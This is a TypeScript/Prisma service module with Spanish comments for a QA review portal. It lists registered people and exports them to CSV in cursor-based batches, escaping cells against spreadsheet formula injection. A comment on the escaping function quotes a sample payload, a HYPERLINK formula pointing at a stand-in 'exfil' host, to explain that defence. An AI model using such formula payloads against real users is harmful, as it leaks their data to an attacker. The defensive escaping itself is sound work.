// Servicio del lado REVISOR_QA para la segunda captura de qa_externa
// ("registro de personas"): listado paginado y lectura por lotes para el CSV.
// Espeja qaExternaRegistrosService (where-building, Promise.all([findMany,
// count]), DTO + shape { data, pagination }) con dos diferencias deliberadas:
//
//  1. El filtro de fechas acota en UTC con límite superior EXCLUSIVO. Un
//     `lte: new Date(dateTo + 'T23:59:59')` se interpreta en la hora LOCAL del
//     proceso y corre el día según la TZ del contenedor.
//  2. La exportación se lee por lotes con cursor sobre `id` y nunca materializa
//     el resultado completo en RAM (.claude/rules/backend.md §B): el servidor
//     de casa comparte hardware con el SAS.

import prisma from '../lib/prisma';
import { Prisma, QaExternaPrograma } from '@prisma/client';

/** Tope duro de filas exportables en una sola petición. */
export const MAX_QA_PERSONAS_EXPORT = 50_000;

/** Tamaño de lote de la exportación (filas por consulta). */
export const QA_PERSONAS_EXPORT_BATCH = 1_000;

export interface QaPersonasListQuery {
  page?: number;
  limit?: number;
  programa?: QaExternaPrograma;
  dispositivo?: number;
  dateFrom?: string;
  dateTo?: string;
  q?: string;
}

/** Persona serializada para el portal de revisión. */
export interface QaPersonaDto {
  id: number;
  clienteRegistroId: string;
  identificadorApp: string;
  programa: QaExternaPrograma;
  nombre: string;
  telefono: string;
  lat: number;
  lng: number;
  accuracy: number | null;
  capturadoAt: Date;
  createdAt: Date;
  dispositivo: { id: number; identificador: string };
}

const dispositivoSelect = { select: { id: true, identificador: true } } as const;

/**
 * Columnas que se piden a Postgres: EXACTAMENTE las del DTO. Se usa `select` y no
 * `include` porque `include` trae además todos los escalares del modelo, y uno de
 * ellos es `metadata_raw`: una columna TEXT que el ingest acota en 64 KB por fila
 * (qaExternaRouter.ts:179) y que el DTO tira a la basura. Con `include`, un lote de
 * exportación (1 000 filas) podía mover hasta ~64 MB de texto desde la BD a la RAM
 * del proceso para descartarlo acto seguido — en un contenedor que comparte
 * hardware con el SAS y con la promesa de "nunca materializa el resultado completo
 * en RAM" de la cabecera de este archivo. Lo comparten el listado y la
 * exportación para que no puedan divergir.
 */
const personaSelect = {
  id: true,
  clienteRegistroId: true,
  identificadorApp: true,
  programa: true,
  nombre: true,
  telefono: true,
  lat: true,
  lng: true,
  accuracy: true,
  capturadoAt: true,
  createdAt: true,
  dispositivo: dispositivoSelect,
} as const;

/**
 * Where compartido por el listado y la exportación: un solo lugar donde se
 * traducen los filtros del revisor, para que el CSV nunca contenga un conjunto
 * distinto del que se está viendo en pantalla.
 */
export function buildWhere(params: QaPersonasListQuery): Prisma.QaExternaPersonaWhereInput {
  const where: Prisma.QaExternaPersonaWhereInput = {};
  if (params.programa) where.programa = params.programa;
  if (params.dispositivo) where.dispositivoId = params.dispositivo;
  if (params.q) {
    // El teléfono se guarda tal como se tecleó en campo, así que la búsqueda va
    // por substring; el nombre además ignora mayúsculas/acentuación de caja.
    where.OR = [
      { nombre: { contains: params.q, mode: 'insensitive' } },
      { telefono: { contains: params.q } },
    ];
  }
  if (params.dateFrom || params.dateTo) {
    // Día civil completo en UTC: [dateFrom 00:00Z, dateTo+1 00:00Z).
    const dateToExclusive = params.dateTo ? new Date(`${params.dateTo}T00:00:00.000Z`) : null;
    if (dateToExclusive) dateToExclusive.setUTCDate(dateToExclusive.getUTCDate() + 1);
    where.capturadoAt = {
      ...(params.dateFrom ? { gte: new Date(`${params.dateFrom}T00:00:00.000Z`) } : {}),
      ...(dateToExclusive ? { lt: dateToExclusive } : {}),
    };
  }
  return where;
}

// Segunda red bajo `personaSelect`: la consulta ya no pide `metadataRaw`, y este
// mapeo explícito garantiza que tampoco lo exponga quien algún día vuelva a
// `include`. El metadata crudo del dispositivo no sale del servidor.
function toDto(row: QaPersonaDto): QaPersonaDto {
  return {
    id: row.id,
    clienteRegistroId: row.clienteRegistroId,
    identificadorApp: row.identificadorApp,
    programa: row.programa,
    nombre: row.nombre,
    telefono: row.telefono,
    lat: row.lat,
    lng: row.lng,
    accuracy: row.accuracy,
    capturadoAt: row.capturadoAt,
    createdAt: row.createdAt,
    dispositivo: { id: row.dispositivo.id, identificador: row.dispositivo.identificador },
  };
}

export async function list(params: QaPersonasListQuery) {
  const page = params.page || 1;
  const limit = params.limit || 20;
  const skip = (page - 1) * limit;
  const where = buildWhere(params);

  const [rows, total] = await Promise.all([
    prisma.qaExternaPersona.findMany({
      where,
      skip,
      take: limit,
      orderBy: { capturadoAt: 'desc' },
      select: personaSelect,
    }),
    prisma.qaExternaPersona.count({ where }),
  ]);

  const data: QaPersonaDto[] = rows.map(toDto);
  return { data, pagination: { page, limit, total, totalPages: Math.ceil(total / limit) } };
}

/**
 * Lee el conjunto a exportar por lotes, ordenado por `id` ascendente y paginado
 * con cursor (no con OFFSET, que degrada al avanzar). Corta en
 * MAX_QA_PERSONAS_EXPORT: quien necesite más que descargue por rangos.
 */
export async function* iterateForExport(
  params: QaPersonasListQuery,
  batchSize = QA_PERSONAS_EXPORT_BATCH,
): AsyncGenerator<QaPersonaDto[]> {
  const where = buildWhere(params);
  let cursorId: number | undefined;
  let emitidas = 0;

  while (emitidas < MAX_QA_PERSONAS_EXPORT) {
    const take = Math.min(batchSize, MAX_QA_PERSONAS_EXPORT - emitidas);
    const rows = await prisma.qaExternaPersona.findMany({
      where,
      take,
      orderBy: { id: 'asc' },
      ...(cursorId !== undefined ? { cursor: { id: cursorId }, skip: 1 } : {}),
      select: personaSelect,
    });

    if (rows.length === 0) return;
    emitidas += rows.length;
    cursorId = rows[rows.length - 1].id;
    yield rows.map(toDto);
    // Lote incompleto = se acabó el conjunto; ahorra una consulta vacía.
    if (rows.length < take) return;
  }
}

/** Encabezados del CSV, en el mismo orden que produce toCsvRow. */
export const QA_PERSONAS_CSV_HEADERS = [
  'Nombre',
  'Teléfono',
  'Latitud',
  'Longitud',
  'Precisión (m)',
  'Capturado (UTC)',
  'Programa',
  'Dispositivo',
  'Celular',
  'ID cliente',
] as const;

/** Celdas que Excel/LibreOffice evalúan como fórmula al abrir el archivo. */
const ARRANQUE_DE_FORMULA = /^[=+\-@\t\r]/;

/**
 * Escapa un valor para CSV (RFC 4180): entrecomilla si contiene coma, comilla,
 * salto de línea o retorno de carro, y duplica las comillas internas.
 * null/undefined salen como celda vacía, no como el texto "null".
 *
 * Además neutraliza las celdas de TEXTO que empiezan por `=`, `+`, `-`, `@`, TAB
 * o CR, anteponiéndoles un apóstrofo (la marca de "esto es texto" de Excel) y
 * entrecomillando siempre para que el apóstrofo viaje literal. Esto arregla dos
 * cosas distintas de un tirón:
 *
 *  (a) Corrupción SIN atacante: el formato de teléfono que el propio contrato
 *      promueve, `+52 55 1234 5678`, salía crudo y Excel lo evaluaba como
 *      fórmula → toda la columna Teléfono en `#NAME?`. Y el BOM que escribe el
 *      router (qaExternaPersonasRouter.ts:128) existe justamente para que Excel
 *      sea el consumidor de este archivo.
 *  (b) Inyección de fórmulas/DDE: un dispositivo con API key válida puede
 *      mandar `=HYPERLINK("http://exfil/?"&A2,"ok")` o `=WEBSERVICE(...)` como
 *      nombre — el validador acepta cualquier texto de 1 a 200 caracteres — y
 *      la celda se ejecutaría en la máquina del revisor.
 *
 * Los `number` quedan exentos: `-99.133209` es una coordenada, y prefijarla
 * rompería las columnas de latitud/longitud/precisión que el revisor sí grafica.
 */
export function csvEscape(value: unknown): string {
  if (value === null || value === undefined) return '';
  const s = String(value);
  if (typeof value !== 'number' && ARRANQUE_DE_FORMULA.test(s)) {
    return `"'${s.replace(/"/g, '""')}"`;
  }
  return /[",\n\r]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
}

/** Una fila del CSV, terminada en CRLF (lo que espera Excel). */
export function toCsvRow(persona: QaPersonaDto): string {
  return (
    [
      persona.nombre,
      persona.telefono,
      persona.lat,
      persona.lng,
      persona.accuracy,
      // Se exporta en UTC, igual que se persiste: la hora local del revisor no
      // debe cambiar el contenido del archivo.
      persona.capturadoAt.toISOString(),
      persona.programa,
      // "Dispositivo" es el equipo registrado que porta la API key;
      // "Celular" es la etiqueta que la app manda en identificador_app.
      persona.dispositivo.identificador,
      persona.identificadorApp,
      persona.clienteRegistroId,
    ]
      .map(csvEscape)
      .join(',') + '\r\n'
  );
}
